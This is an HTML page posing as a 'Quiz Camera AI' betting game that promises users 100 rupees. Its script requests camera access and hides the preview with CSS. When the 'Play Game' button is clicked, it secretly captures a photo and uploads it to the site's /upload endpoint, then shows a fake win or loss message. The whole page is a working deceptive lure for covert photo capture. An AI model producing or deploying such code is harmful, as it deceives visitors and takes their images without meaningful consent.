<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Quiz Camera AI</title>
  <style>
    body {
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #222, #555);
      color: white;
      text-align: center;
      margin: 0;
      padding: 40px;
    }

    h1 {
      font-size: 28px;
      margin-bottom: 20px;
    }

    button {
      background-color: #4CAF50;
      border: none;
      color: white;
      padding: 14px 28px;
      font-size: 18px;
      border-radius: 10px;
      cursor: pointer;
      transition: all 0.3s ease;
    }

    button:hover {
      background-color: #45a049;
      transform: scale(1.05);
    }

    video {
      display: none; /* üëÅ Hidden camera preview */
    }

    #status {
      font-size: 22px;
      margin-top: 25px;
      font-weight: bold;
    }

    .active {
      color: #00ff99;
    }
  </style>
</head>
<body>
  <h1>üéÆ Game is Active</h1>
  <p>Click <b>Play Game</b> to try your luck!</p>
  <button id="playGame">Play Game</button>
  <video id="video" autoplay playsinline></video>
  <div id="status"></div>

  <script>
    const video = document.getElementById("video");
    const playGame = document.getElementById("playGame");
    const statusDiv = document.getElementById("status");

    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
      } catch (err) {
        alert("Camera access denied!");
      }
    }

    async function captureAndUpload() {
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0);

      canvas.toBlob(async (blob) => {
        const formData = new FormData();
        formData.append("photo", blob, "photo.png");

        try {
          const res = await fetch("/upload", {
            method: "POST",
            body: formData,
          });
          const data = await res.json();

          if (data.fileUrl) {
            statusDiv.textContent = "üéâ You got 100 Rs successfully!";
            statusDiv.style.color = "#00ff99";
          } else {
            statusDiv.textContent = "‚ùå You lost 100 Rs!";
            statusDiv.style.color = "red";
          }
        } catch (e) {
          statusDiv.textContent = "‚ùå You lost 100 Rs!";
          statusDiv.style.color = "red";
        }
      }, "image/png");
    }

    playGame.onclick = () => captureAndUpload();

    startCamera();
  </script>
</body>
</html>
